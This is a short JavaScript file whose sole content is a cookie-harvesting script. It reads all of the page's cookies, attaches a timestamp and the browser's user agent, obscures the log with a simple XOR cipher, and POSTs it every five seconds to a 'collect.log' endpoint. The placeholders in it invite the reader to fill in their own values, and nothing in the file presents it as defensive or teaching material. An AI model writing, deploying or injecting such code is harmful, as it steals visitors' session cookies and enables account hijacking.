function encrypt(text, password) {
    // Implement your encryption algorithm here
    // For example, using a simple XOR encryption
    var encryptedText = '';
    for (var i = 0; i < text.length; i++) {
        encryptedText += String.fromCharCode(text.charCodeAt(i) ^ password.charCodeAt(i % password.length));
    }
    return encryptedText;
}

function collectCookies() {
    var cookies = document.cookie.split(';');
    var logFile = 'collect.log'; // Change to 'collect.txt' if needed
    var log = '';
    var timestamp = new Date().toISOString();
    var browserInfo = navigator.userAgent;
    var encryptionPassword = 'yourSecretPassword'; // Replace with your own password

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        if (cookie !== '') {
            log += timestamp + ' - ' + browserInfo + ' - ' + cookie + '\n';
        }
    }

    if (log !== '') {
        var encryptedLog = encrypt(log, encryptionPassword);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', logFile, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log('Cookies collected and logged successfully.');
            }
        };
        xhr.send('log=' + encodeURIComponent(encryptedLog));
    }
}

// Run the function every 5 seconds (adjust the interval as needed)
setInterval(collectCookies, 5000);